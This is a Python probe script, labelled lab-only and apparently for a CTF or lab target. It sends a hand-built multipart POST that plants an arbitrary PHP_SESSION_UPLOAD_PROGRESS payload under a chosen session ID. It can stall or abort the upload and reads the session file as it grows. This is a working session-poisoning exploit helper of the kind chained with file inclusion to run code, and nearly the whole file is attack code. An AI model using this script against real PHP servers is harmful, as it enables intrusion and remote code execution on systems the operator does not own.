#!/usr/bin/env python3
"""Upload-progress session probe for the apppop receipt (lab-only)."""
import argparse
import os
import socket
import sys
import time

BOUNDARY = b"----apppopboundary7f3a"


def build_prefix(payload: bytes) -> bytes:
    return (
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + payload + b"\r\n"
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="file"; filename="blob.bin"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n"
    )


def build_suffix() -> bytes:
    return b"\r\n--" + BOUNDARY + b"--\r\n"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=28866)
    ap.add_argument("--path", default="/lab_upload_sink.php")
    ap.add_argument("--sid", required=True)
    ap.add_argument("--payload", required=True)
    ap.add_argument("--size", type=int, default=1024 * 1024)
    ap.add_argument("--chunk", type=int, default=128 * 1024)
    ap.add_argument("--sleep", type=float, default=0.0)
    ap.add_argument("--mode", choices=["complete", "slow-abort", "slow-finish"], default="complete")
    ap.add_argument("--session-file", default="")
    ap.add_argument("--inspect-every", type=float, default=0.3)
    ap.add_argument("--outdir", default=".")
    args = ap.parse_args()

    payload = args.payload.encode("latin-1")
    prefix = build_prefix(payload)
    suffix = build_suffix()
    total = len(prefix) + args.size + len(suffix)

    req = (
        b"POST " + args.path.encode() + b" HTTP/1.1\r\n"
        b"Host: " + args.host.encode() + b"\r\n"
        b"Cookie: PHPSESSID=" + args.sid.encode() + b"; wikidb_session=" + args.sid.encode() + b"\r\n"
        b"Content-Type: multipart/form-data; boundary=" + BOUNDARY + b"\r\n"
        b"Content-Length: " + str(total).encode() + b"\r\n"
        b"Connection: close\r\n\r\n"
    )

    s = socket.create_connection((args.host, args.port), timeout=30)
    s.sendall(req)
    s.sendall(prefix)

    sent = 0
    blk = b"A" * args.chunk
    start = time.time()
    while sent < args.size:
        n = min(args.chunk, args.size - sent)
        s.sendall(blk[:n])
        sent += n
        if args.sleep:
            time.sleep(args.sleep)
            if args.session_file and os.path.exists(args.session_file):
                st = os.stat(args.session_file)
                print(f"[t={time.time()-start:.2f}] sent={sent} file_size={st.st_size}", flush=True)
                with open(args.session_file, "rb") as f:
                    data = f.read()
                print("  file[:400]=" + repr(data[:400]), flush=True)

    if args.mode == "slow-abort":
        print(f"[abort] sent={sent}/{args.size}; closing socket abruptly", flush=True)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b"\x01\x00\x00\x00\x00\x00\x00\x00")
        s.close()
        return 0

    s.sendall(suffix)
    if args.mode == "slow-finish":
        print(f"[finish] full body sent ({total} bytes)", flush=True)
    s.shutdown(socket.SHUT_WR)

    resp = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            resp += d
            if len(resp) > 200000:
                break
    except socket.timeout:
        pass
    s.close()

    status = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace") if resp else "(no response)"
    print("response_status:", status, flush=True)
    print("response_bytes:", len(resp), flush=True)
    head, _, body = resp.partition(b"\r\n\r\n")
    with open(os.path.join(args.outdir, "last_upload_resp.bin"), "wb") as f:
        f.write(resp)
    print("body[:300]=" + repr(body[:300]), flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
